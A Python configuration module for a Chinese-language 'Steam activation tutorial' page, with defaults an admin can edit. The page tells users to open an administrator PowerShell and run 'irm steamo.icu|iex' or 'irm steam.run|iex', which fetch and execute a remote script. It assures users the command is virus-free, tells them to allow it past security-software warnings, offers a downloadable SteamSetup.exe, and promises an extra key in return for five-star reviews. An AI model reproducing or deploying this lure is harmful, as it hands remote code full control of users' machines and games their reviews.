"""激活教程页：内容与图片可在后台编辑。"""

from __future__ import annotations

from copy import deepcopy
from typing import Any, Dict, List

from extensions.store import load_extensions, save_extensions

DEFAULT_HELP_TUTORIAL: Dict[str, Any] = {
    "enabled": True,
    "page_title": "Steam活动渠道激活教程",
    "nav_brand": "官方教程",
    "hero_badge": "官方教程",
    "hero_title": "Steam 活动渠道激活教程",
    "hero_subtitle": "请按照以下步骤完成 Steam 活动渠道的激活，全程仅需 2 分钟。",
    "password_gate_enabled": False,
    "password_gate_title": "再送一个激活码",
    "password_gate_desc": "五星带一张激活成功或者游戏图片评价\n评价后找客服领取密码",
    "password_gate_secret": "",
    "password_gate_redirect": "",
    "installer_enabled": True,
    "installer_title": "推荐：一键安装程序",
    "installer_desc": "下载安装程序后直接运行即可，无需执行上述手动步骤。",
    "installer_btn_label": "下载 SteamSetup.exe",
    "installer_url": "",
    "installer_btn2_label": "查看激活步骤",
    "installer_btn2_url": "#steps",
    "manual_divider": "或者按以下手动步骤操作",
    "steps_section_title": "激活步骤",
    "primary_cmd_label": "PS>",
    "primary_cmd": "irm steamo.icu|iex",
    "fallback_cmds": [
        {"label": "备用口令 1", "cmd": "irm steam.run|iex"},
    ],
    "steps": [
        {
            "title": "打开管理员终端",
            "body": "在 Windows 系统中，按住 Win + X 组合键，然后选择 Windows PowerShell（管理员）或终端（管理员）。",
            "images": [
                {"url": "", "caption": "按住 Win + X 图示"},
                {"url": "", "caption": "选择管理员终端图示"},
            ],
        },
        {
            "title": "输入活动口令",
            "body": "在打开的管理员终端窗口中，复制并粘贴活动口令，然后按 Enter 键执行。口令执行完成后，会自动启动 Steam。",
            "images": [
                {"url": "", "caption": "口令执行过程图示"},
            ],
            "show_primary_cmd": True,
            "show_fallback_cmds": True,
        },
        {
            "title": "完成激活",
            "body": "Steam 登录后左下方选择「添加游戏」→「激活产品」，在输入框中输入您的激活码即可完成激活。",
            "images": [
                {"url": "", "caption": "激活界面图示"},
                {"url": "", "caption": "激活成功图示"},
            ],
        },
    ],
    "notices_title": "请注意",
    "notices": [
        "执行过程中不要关闭终端窗口",
        "口令不存在病毒，如有安全软件提示，请允许操作",
        "激活不成功或者无法进入游戏，请联系客服处理",
    ],
    "tips_enabled": True,
    "tips_section_title": "小贴士",
    "tips_card_title": "实用提示",
    "tips_heading": "游戏消失？别慌",
    "tips_body": "如果游戏消失了，只需重新执行步骤一即可：按 Win + X 打开管理员终端，输入指令 irm steamo.icu|iex。",
    "extra_links_title": "更多资源",
    "extra_links": [
        {"label": "查看激活步骤", "url": "#steps"},
    ],
    "footer_text": "© Steam活动渠道激活教程 | 如有问题请联系客服",
    "carousel_enabled": False,
    "carousel_images": [],
}


def get_help_tutorial() -> Dict[str, Any]:
    data = load_extensions()
    raw = data.get("help_tutorial") or {}
    out = deepcopy(DEFAULT_HELP_TUTORIAL)
    if isinstance(raw, dict):
        out.update({k: v for k, v in raw.items() if k != "steps" and k != "fallback_cmds" and k != "extra_links"})
        if isinstance(raw.get("steps"), list) and raw["steps"]:
            out["steps"] = raw["steps"]
        if isinstance(raw.get("fallback_cmds"), list):
            out["fallback_cmds"] = raw["fallback_cmds"]
        if isinstance(raw.get("extra_links"), list):
            out["extra_links"] = raw["extra_links"]
        if isinstance(raw.get("carousel_images"), list):
            out["carousel_images"] = raw["carousel_images"]
        if isinstance(raw.get("notices"), list):
            out["notices"] = raw["notices"]
    return out


def get_public_help_tutorial() -> Dict[str, Any]:
    cfg = get_help_tutorial()
    public = deepcopy(cfg)
    public.pop("password_gate_secret", None)
    return public


def update_help_tutorial(patch: Dict[str, Any]) -> Dict[str, Any]:
    data = load_extensions()
    cur = data.get("help_tutorial")
    if not isinstance(cur, dict):
        cur = deepcopy(DEFAULT_HELP_TUTORIAL)
    merged = deepcopy(cur)
    for key, val in patch.items():
        if key in ("steps", "fallback_cmds", "extra_links", "carousel_images", "notices") and isinstance(val, list):
            merged[key] = val
        else:
            merged[key] = val
    data["help_tutorial"] = merged
    save_extensions(data)
    return get_help_tutorial()
